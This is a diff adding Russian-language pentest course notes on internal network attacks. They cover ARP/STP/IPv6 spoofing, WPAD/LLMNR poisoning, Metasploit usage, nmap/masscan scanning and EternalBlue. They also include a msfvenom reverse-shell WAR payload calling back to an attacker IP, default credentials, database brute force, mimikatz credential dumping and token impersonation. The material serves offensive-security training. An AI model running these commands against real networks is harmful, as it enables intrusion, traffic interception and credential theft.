@@ -1,0 +1,318 @@
+Занятие 1
+
+Внутренний пентест - моделируем нарушителя внутри сети
+
+Черный ящик - гость
+Серый ящик - сотрудник
+
+PSI DSS - требования к пентесту, задача получение "Данных платежных карт"
+
+
+
+Карта атаки
+Мы --> Окружение (чаще всего active directory) --> Повышение --> Цель
+
+План
+1. Wireshark
+2. Сканирование
+3. "Пробив" (узнаем что можно)
+4. Сбор loot (повышение)
+5. Достижение цели
+
+
+
+Воткнувшись в сеть и запустив wireshark мы ловим широковещательный трафик по следующим протоколам:
+
+STP (защита от петель в сети)
+Если в destination - Spaning-Tree-For-Bridges, то в сети стоит самая старая версия STP. Ее можно обмануть и использовать в своих целях
+STP DOS:
+	https://bugtraq.ru/library/books/stp/chapter06/
+	http://cybervlad.net/stp/index.html
+
+sudo yersinia -G (или -I в консольном режиме)
+
+Защита от STP (есть в 90% случаев)
+	Включение BPDUGuard и BPDUFilter
+	Отключение STP на портах access (для остановки получения BDPU от пользователей)
+	Port Security
+
+
+ARP (50%)
+ARP spoofing
+	mitmf (фреймворк уже не поддерживаеся, но пока жив арп, н будет актуален)
+	ettercap -T 10.10.10.10 -X --httpd --proxy-https --proxy
+	arpspoof -i eth0 -t 10.10.10.10
+	Intercepter-NG
+
+	
+DTP (Dynamic Trunking Protocol) (5%)
+	Встречается очень редко, но можно перепрыгвать по виланам
+	Scapy
+	dtp.spoof.py
+
+
+VTP (Обмен нформации о существовающих VLAN) (5%)
+	
+
+Rogue DHCP (90%)
+(Full Slaak Attack) Очень мощная атака
+В ненастроенной IPv6 сети можно стать роутером
+Этот стандарт дефолтно включен на всех устройствах, более того, в WIndows IPv6 приоритетнее остальных протоколов
+Но это может так-же работать как дос
+	mitm6 -i eth0  	(упрощенная версия, которая не кладе сеть)
+
+
+HSRP (8%)
+	сморим, не передается ли autheticatio data в чистом виде
+	yersinia
+	scapy
+
+
+RIPv2 (2%)
+	если видим RIP - сразу пишем об эом как об уязвимостии
+
+
+OSPF (1%)
+	нет инструментов для атак
+
+
+EIGRP
+	Как и большнство атак на маршрутизацию, не используется, т.к. вызывает дос
+	eigrp tools
+	t50	
+
+
+ICMP 
+	ICMP  Redirect
+
+
+NBT-NS/LLMNR  poisoning 
+	Порядок поиска хоста по DNS
+	file "hosts"
+	Cash DNS
+	Request DNS
+	NBT-DNS
+
+WPAD (98%)
+По дефолту включен в винде, позволяет подсунуь нашг прокси и гнать весь трафик через него
+	Responder
+	Mitm6
+	Inveigh
+	msf (auxiliary/spoof/ndns/nbns_response) (auxiliary/spoof/llmnr/llmnr_response)
+
+
+CDP (Cisco Discovery Protocol)
+Раскрывае много информации о девайсе, реальный ip, VLAN, в котором мы находимся
+
+
+
+
+
+Занятие 2
+
+msf
+
+Auxiliary
+Exploits
+Payloads
+Post
+Encoders (в теории скрывают вредоносное по от антиврусов. На практике больше используются на CTF и OSCP. Например для обхода запрещенных символов)
+
+
+
+Auxiliary
+
+
+
+Exploits
+use exploit/multi/handler - хендлер
+
+
+
+Post
+Постэксплуатация
+Сбор  перечисление информации о системе
+Сбор и перечисление иинформации о домене
+Pivoting
+Сканирование
+
+
+
+Все модули сосотоят из:
+Name
+Description
+Author
+Disclosure date
+Platform/Arch
+License
+Target (если эксплоит не работает, )
+
+
+
+Настройка среды msf
+$ sudo postgresql start (enable)
+$ sudo msfdb init
+$ msfconsole
+msf6> db_status		Проверить статус базы данных
+
+
+
+Поск 
+msf6> search name:mysql
+msf6> search platform:aix
+msf6> search type:post
+msf6> search cve:2011 author:jduck platform:linux
+
+Grep
+msf6> grep http search oracle
+msf6> grep ms17 search windows
+Сначала что грепаем, потом откуда грепаем 
+
+
+
+Workspace
+msf6> workspace -a <name>	Создаем рабочее пространство
+msf6> workspace <name>		Перейти в рабочее пространство
+
+
+
+Options
+msf6> show options
+msf6> show advansed
+msf6> show targets
+msf6> set <option>
+msf6> unset <option>		
+msf6> setg <option>		Глобальное значениие параметра
+msf6> unsetg <option>		Снять глобальное значение параметра
+
+
+
+Sessions
+msf6> sessions -l		Список активных сессий
+msf6> sessions -i <number>	Подключииться к сессии	
+msf6> sessions -c 		Выполнение системной команды
+msf6> sessions -C		Выполнениие команды метерпретера
+msf6> sessions -K		Убить все сессии
+
+Jobs
+msf6> 
+
+
+
+Meterpreter
+Migrate (мграциия под другой процесс, что бы было сложнее задетектить процесс)
+Download/Upload
+Normal Linux comands
+Loading of other modules (Powershell, Python (если на хосте нет питона), Kiwi...)
+
+
+
+Masscan (для сканирования очень больших подсетей)
+$ masscan 192.168.0.0/16 -p 1-65535 --rate=9999999 -oX scan_result
+
+Nmap
+$ nmap -Pn (десктопная внда не отвечает при включенном пинг скане) -n -sV (чаще всего не нужно пр массовом скане) \
+--min-rate=400 --min-parallelism=512 (оптимальный параметр подобраный опытным путем) -p 21, 22, 445, 623, 1433, 5432, \
+5555, 8080, 8081, 8180, 8443, 4786, 1099, 27017 --open -oA result -v 192.168.0.0/16
+
+21 - ftp (если можно подключиться анонмно, это хорошо)
+22 - =)
+445 - smb
+623 - ibmi
+1433 - mssql (слабый пароль на учетной записи SA)
+3389 - rdp (свежая bluekeep)
+5432 - postgresql (слабая конфигурация пароля)
+5555 - HP dataprotector (часто он без пароля)
+8081 - tomcat для деплоя java прложений (учетка tomcat:tomcat)
+4786 - cisco smart install (по умолчанию включен, можно стащить конфиг циски, в котором может лежать пароль в чстом или кодированном виде)
+1099 - 
+27017 - mongodb (не требует авторизации по дефолту)
+
+
+
+Типовые вектора
+
+MS17-010 (60%)
+smb_ms17_010
+ms17_010_eternalblue (
+ms17_010_psexec (если pipe доступен, то лучше спользовать во всех случаях)
+ms17_010_eternalblue_win8
+
+
+
+msf6> cd <folder with scan> 				Переходим в папку со сканом
+msf6> db_import scan					Подгружаем файл сканирования в базу данных msf
+msf6> services						Вывод информации из базы данных
+msf6> services -p 445					Выводм только с портами 445
+msf6> use auxiliary/scaner/smb/smb_version		
+msf6> options						
+msf6> services -p 445 -R				Устанавливаем дапазон машиин как RHOST
+msf6> set threads 50					
+msf6> set verbose false					
+msf6> run						
+msf6> services -p 445					Теперь имеем всю информацию
+msf6> use auxiliary/scaner/smb/smb_ms17_010
+msf6> set threads 100
+msf6> 
+
+
+хинт к дз (238)
+
+
+
+
+
+
+
+
+
+Занятие 3
+
+В show dvanced можно сразу после получения сессии выполнить скрипт (autoscript)
+
+Если на машине стоит антивирус, то mssql_exec 
+
+
+
+msf6> creds		Показывает все подобранные учетки
+
+
+
+meterpreter
+webcam_list 	список камер
+screenshot	сделать скрин
+reboot
+
+
+
+Брут баз данных
+auxiliary/scaner/postgres/postgres_login
+auxiliary/scaner/mssql/mssql_login
+
+
+
+msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.37 LPORT=4444 -f war -o shell_meter.war
+
+
+
+Горизонтальное перемещение
+
+NTLM Hash
+
+
+После получения доступа с правами системы можем:
+procdump 
+mimikatz
+kiwi
+
+Если антивирус не дает нам сделать никакой из дампов
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token "NT_AUTHORITY\\SYSTEM"
+
+
+
+
+Bash
+Ctrl + R	Найти ии выполнить команду из истории
+zcat 		cat файл из архива
